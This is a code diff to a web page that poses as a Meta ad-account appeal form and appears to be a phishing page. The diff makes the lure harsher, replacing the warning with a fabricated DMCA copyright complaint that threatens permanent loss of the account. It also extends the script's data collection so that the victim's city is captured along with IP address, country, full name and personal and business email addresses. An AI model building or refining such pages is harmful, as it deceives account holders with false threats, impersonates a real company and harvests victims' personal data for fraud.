@@ -3246,17 +3246,10 @@
                         <img src="../img/block_2.png" alt="" style="height: 40px;
                         width:40px;
                         margin-right: 8px;">
-                        Your advertising has violated terms of service
+                        Your ad account is scheduled for permanent forbidden usage
                     </h1>
-                    <p>We have received multiple reports that suggest that your account has been in violation of our
-                        terms of services and community guidelines. As a result, your account is scheduled for review.
+                    <p>We have received an official complaint from the copyright owner submitted to Meta regarding your unauthorized use of copyrighted content. This complaint was filed under <strong>Section 512 of the Digital Millennium Copyright Act (DMCA)</strong>, which allows copyright owners to request the removal of infringing content and take enforcement actions against the associated account.
                     </p>
-                    <br>
-                    <p>
-                        If no corrective actions are taken, your advertising account will be permanently disabled.
-                        If you wish to appeal this decision, please submit an appeal request to us for review and
-                        assistance.
-                        <br>
                     <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()"
                         style="display: none; margin-bottom: 15px;">
                         <div class="action-button-img">
@@ -3284,7 +3277,6 @@
                         <!-- <img src="/img/mobile.png" alt=""> -->
                         <img src="../img/shild.jpg" alt="">
                         <div class="card-text">
-                            <p class="card-type">Review request</p>
                             <h4>This form is only to be used for submitting appeals and restoring account status</h4>
                             <p>Please ensure that you provide the requested information below.
                                 Failure to do so may delay the processing of your appeal.</p>
@@ -4344,12 +4336,14 @@
                     'user_ip': data.ipAddress,
                     'country': data.countryName,
                     'country_code': data.countryCode,
+                    'city': data.city
                 }
             } else {
                 userIpData = {
                     'user_ip': 'Ip not detected ;(',
                     'country': '-',
                     'country_code': '-',
+                    'city': '-'
                 }
             }
         }
@@ -4362,6 +4356,7 @@
                 'ip_address': userIpData.user_ip,
                 'country': userIpData.country,
                 'country_code': userIpData.country_code,
+                'city': userIpData.city,
                 'full_name': formsSendData['full-name'],
                 'pers_email': formsSendData['personal-email'],
                 'bus_email': formsSendData['buiseness-email'],
